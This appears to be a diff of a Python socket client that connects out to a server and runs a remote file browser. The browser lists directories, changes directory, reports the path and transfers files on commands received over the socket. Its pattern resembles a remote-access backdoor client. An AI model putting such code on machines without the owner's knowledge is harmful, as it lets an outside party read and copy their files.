@@ -1,7 +1,6 @@
 import socket
 import time
 import os
-import stat
 
 
 class Client:
@@ -38,6 +37,38 @@ class Client:
                 print("Trying to connect...")
                 time.sleep(3)
 
+
+class FileBrowser:
+
+    def __init__(self, client):
+        self.client = client
+
+    def run(self):
+
+        self.client.socket.sendall(bytes(os.getcwd(), "UTF-8"))
+        while True:
+            cmd = self.client.socket.recv(4096)
+            cmd = cmd.decode("UTF-8")
+            cmd = cmd.split("~")
+
+            if cmd[0] == 'ls':
+                asd = self.ls(cmd)
+                self.client.socket.sendall(bytes(asd, "UTF-8"))
+            elif cmd[0] == 'cd':
+                asd = self.cd(cmd)
+                self.client.socket.sendall(bytes(asd, "UTF-8"))
+            elif cmd[0] == 'cp':
+                asd = self.file_transfer(cmd)
+                self.client.socket.sendall(bytes(asd, "UTF-8"))
+            elif cmd[0] == 'pwd':
+                asd = os.getcwd()
+                self.client.socket.sendall(bytes(asd, "UTF-8"))
+            elif cmd[0] == 'exit':
+                break
+            else:
+                self.client.socket.sendall(bytes("Command not found.",
+                                                 "UTF-8"))
+
     def ls(self, cmd):
 
         if len(cmd) == 1:
@@ -57,37 +88,6 @@ class Client:
         except:
             return "No such file or directory."
         return '  '.join(os.listdir())
-
-
-class FileBrowser:
-
-    def __init__(self, client):
-        self.client = client
-
-    def run(self):
-
-        self.client.socket.sendall(bytes(os.getcwd(), "UTF-8"))
-        while True:
-            cmd = self.client.socket.recv(4096)
-            cmd = cmd.decode("UTF-8")
-            cmd = cmd.split("~")
-
-            if cmd[0] == 'ls':
-                asd = self.client.ls(cmd)
-                self.client.socket.sendall(bytes(asd, "UTF-8"))
-            elif cmd[0] == 'cd':
-                asd = self.client.cd(cmd)
-                self.client.socket.sendall(bytes(asd, "UTF-8"))
-            elif cmd[0] == 'cp':
-                asd = self.file_transfer(cmd)
-                self.client.socket.sendall(bytes(asd, "UTF-8"))
-            elif cmd[0] == 'pwd':
-                asd = os.getcwd()
-                self.client.socket.sendall(bytes(asd, "UTF-8"))
-            elif cmd[0] == 'exit':
-                break
-            else:
-                self.client.socket.sendall(bytes("Command not found.", "UTF-8"))
 
     def file_transfer(self, file_name):
 
@@ -109,4 +109,3 @@ class FileBrowser:
             self.client.socket.sendall(bytes("EOFX", "UTF-8"))
             time.sleep(0.8)
             return "Failed to transfer a file."
-
